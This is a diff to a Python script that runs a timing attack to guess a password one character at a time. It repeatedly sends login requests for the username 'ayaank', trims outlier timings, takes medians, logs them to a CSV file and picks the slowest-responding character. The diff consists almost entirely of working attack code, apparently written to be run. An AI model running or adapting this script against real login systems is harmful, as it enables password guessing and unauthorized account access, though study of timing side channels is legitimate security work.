@@ -5,8 +5,8 @@ import requests
 from bs4 import BeautifulSoup
 from datetime import datetime
 import time 
-
-
+import argparse
+import statistics
 
 url = 'https://csc.calpoly.edu/faculty/'
 
@@ -73,36 +73,55 @@ def username():
         if (creds):
             print(creds)
             break
+def measure_time(username, password):
+    """Measure the time taken for a request."""
+    start_time = time.time()
+    curl_request(username, password)
+    end_time = time.time()
+    return end_time - start_time
 
-def bruteforce(username):
 
-    best_password = "" 
-    best_character = ""
-    max_time = 0
+def bruteforce(username, filename):
+    """Perform a timing attack to deduce the first character of a password."""
+    results = []
     for character in possible_characters:
         
         password = ""
-        highest_time = 0
         password += character
-        password += character
-        average_time = 0
-        for i in range(0,51):
+        password += character 
+        print(password)
+        timings = []
 
-            start_time = time.time()
-            curl_request(username, password)
-            end_time = time.time()
-            duration = end_time - start_time
-            average_time +=duration
+        # Measure timing for multiple iterations
+        for _ in range(100):  # Use more iterations for better accuracy
+            timings.append(measure_time(username, password))
 
-        average_time = average_time / 50
-        
-        if average_time > max_time:
-            max_time = average_time
-            best_character = character
+        # Remove outliers (top and bottom 10%)
+        sorted_timings = sorted(timings)
+        trimmed_timings = sorted_timings[len(timings) // 10: -len(timings) // 10]
 
-            print(best_character)
+        # Calculate the median timing
+        median_time = statistics.median(trimmed_timings)
+        results.append((character, median_time))
+
+        # Log results to CSV
+        with open(filename, mode='a', newline='') as file:
+            writer = csv.writer(file)
+            writer.writerow([character, median_time])
+
+    # Find the best character based on timing
+    best_character = max(results, key=lambda x: x[1])[0]
+    print(f"Best character: {best_character}")
+    return best_character
 
 def main():
-    bruteforce("ayaank")
+    parser = argparse.ArgumentParser(description="Process a file for bruteforce.")
+    parser.add_argument("filename", type=str, help="Path to the input file")
+
+    # Parse arguments
+    args = parser.parse_args()
+    filename = args.filename
+
+    bruteforce("ayaank", filename)
 if __name__ == "__main__":
     main()
